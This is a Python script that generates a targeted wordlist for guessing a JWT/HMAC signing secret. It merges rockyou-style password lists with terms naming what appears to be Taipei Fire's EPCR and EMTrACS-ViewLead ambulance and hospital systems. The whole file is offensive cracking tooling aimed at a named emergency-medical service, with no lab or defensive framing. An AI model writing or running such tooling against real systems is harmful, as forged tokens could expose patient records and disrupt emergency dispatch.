import itertools
def load(path):
    try:
        w=[]
        for l in open(path,encoding='utf-8',errors='ignore'):
            l=l.strip()
            if l and not l.startswith('#') and not l.startswith('--'):
                w.append(l)
        return w
    except: return []
base=set()
for p in ['/tmp/secret_wordlist.txt','/tmp/wordlist.txt','/tmp/rockyou_top1k.txt']:
    base|=set(load(p))
base=list(base)

# domain/app terms (Taipei Fire / EPCR / EMTrACS-ViewLead)
app=['epcr','emtracs','emtapp','viewlead','tpf','ntpc','nycd','taipeifire','taipei','fire',
     'ambulance','dispatch','vitalsign','vital','hospital','mer','mci','auth','server','epcrserver',
     'authserver','epcr2024','epcr2025','tpf2024','tpf2025','ntpc2024','ntpc2025']
secret_terms=['secret','secretkey','secret_key','jwt','jwtsecret','jwt_secret','jwtsecretkey',
 'signing','signingkey','signing_key','signkey','apikey','api_key','token','auth','pepper','salt',
 'supersecret','super_secret','s3cr3t','passphrase','key','private','privatekey','hs256','hmac']
cand=[]; seen=set()
def add(x):
    x=str(x)
    if x and len(x)<=64 and x not in seen:
        seen.add(x); cand.append(x)

# P0: targeted secret wordlist verbatim
for w in load('/tmp/secret_wordlist.txt'): add(w)
# P1: app terms + secret terms combos
for a in app:
    add(a)
    for st in secret_terms:
        add(a+st); add(st+a); add(a+'_'+st); add(st+'_'+a); add(a+'-'+st); add(st+'-'+a)
        add(a.capitalize()+st.capitalize()); add(st.capitalize()+a.capitalize())
# P2: secret terms alone (with case variants)
for st in secret_terms:
    add(st); add(st.upper()); add(st.lower()); add(st.title())
# P3: rockyou/wordlist top
for w in load('/tmp/rockyou_top1k.txt'): add(w)
for w in base[:1500]: add(w)
# P4: app term x common words (bounded)
common=load('/tmp/rockyou_top1k.txt')[:400]
for a in app:
    for w in common[:120]:
        add(a+w); add(w+a); add(a+'_'+w); add(a+w+'123')
# P5: number appends on app+secret terms
for t in app+secret_terms:
    for n in ['123','456','789','1234','12345','123456','654321','1','0','2024','2025','2026','2023','99','88','66']:
        add(t+n); add(n+t); add(t+'_'+n)
# P6: common password phrases
for p in ['password','Password','PASSWORD','changeme','changeme123','letmein','qwerty','admin','root',
          '123456','1234','abc123','iloveyou','welcome','passw0rd','p@ssw0rd','secret123','secret1','Secret123']:
    add(p); add('epcr'+p); add(p+'epcr'); add(p+'_epcr')
open('candidates.txt','w').write('\n'.join(cand))
print("total unique candidates:",len(cand))
